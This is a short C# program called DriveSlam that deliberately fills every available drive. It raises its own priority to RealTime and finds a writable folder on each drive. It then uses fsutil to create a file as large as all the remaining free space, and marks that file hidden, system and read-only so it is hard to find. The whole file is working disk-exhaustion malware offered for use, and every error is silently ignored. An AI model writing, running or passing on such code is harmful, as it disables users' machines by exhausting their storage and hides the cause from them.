/*
 * Attempts to use all available disk space on every drive
 */

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Security.AccessControl;
using System.Security.Principal;

namespace DriveSlam
{
    internal class Program
    {
        private static Random rng = new Random();

        private static void SetHighPriority() // Try to get the highest priority it can
        {
            try
            {
                Process.GetCurrentProcess().PriorityClass = ProcessPriorityClass.AboveNormal;
            }
            catch (Exception) { }

            try
            {
                Process.GetCurrentProcess().PriorityClass = ProcessPriorityClass.High;
            }
            catch (Exception) { }

            try
            {
                Process.GetCurrentProcess().PriorityClass = ProcessPriorityClass.RealTime;
            }
            catch (Exception) { }
        }

        private static string GenerateNumbers()
        {
            string s = string.Empty;

            for (int i = 1; i <= rng.Next(2, 8); i++)
                s = s + (rng.Next(0, 42069)).ToString();

            return s;
        }

        private static bool CanAccessDirectory(string path)
        {
            if (string.IsNullOrWhiteSpace(path) || !Directory.Exists(path))
                return false;

            try
            {
                WindowsIdentity user = WindowsIdentity.GetCurrent();
                WindowsPrincipal principal = new WindowsPrincipal(user);

                AuthorizationRuleCollection rules = new DirectoryInfo(path).GetAccessControl().GetAccessRules(true, true, typeof(NTAccount));

                foreach (AuthorizationRule rule in rules)
                {
                    FileSystemAccessRule fRule = (FileSystemAccessRule)rule;
                    if (fRule == null) continue;

                    if ((fRule.FileSystemRights & FileSystemRights.CreateFiles) > 0)
                    {
                        NTAccount nt = (NTAccount)rule.IdentityReference;
                        if (nt == null) continue;

                        if (principal.IsInRole(nt.Value))
                            return fRule.AccessControlType != AccessControlType.Deny;
                    }
                }
            }
            catch (Exception) { }
            
            return false;
        }

        private static List<string> SafeGetDirectories(string path)
        {
            List<string> directories = new List<string>();

            try
            {
                foreach (string s in Directory.GetDirectories(path)) // This can cause an error if access is denied which is why this method exists in the first place
                    directories.Add(s);
            }
            catch (Exception) { }

            return directories;
        }

        private static string FindWritableDirectory(string path)
        {
            if (CanAccessDirectory(path)) return path;

            string s = string.Empty;

            foreach (string dir in SafeGetDirectories(path))
            {
                if (CanAccessDirectory(dir)) return dir;

                s = FindWritableDirectory(dir);
            }

            return s;
        }

        static void Main(string[] args)
        {
            SetHighPriority();

            foreach (DriveInfo d in DriveInfo.GetDrives())
            {
                if (!d.IsReady) continue;

                string curpath = FindWritableDirectory(d.Name);

                if (curpath.Equals(string.Empty)) continue;

                try
                {
                    string file = curpath + "\\" + GenerateNumbers();

                    ProcessStartInfo psi = new ProcessStartInfo();
                    psi.FileName = "fsutil.exe";
                    psi.Arguments = "file createnew \"" + file + "\" " + d.TotalFreeSpace; // fsutil file createnew (filename) (sizeinbytes)

                    Process p = Process.Start(psi);
                    p.WaitForExit();

                    if (File.Exists(file))
                    {
                        FileAttributes atr = File.GetAttributes(file); // Try to hide the file
                        File.SetAttributes(file, atr | FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System);
                    }
                }
                catch (Exception) { }
            }
        }
    }
}
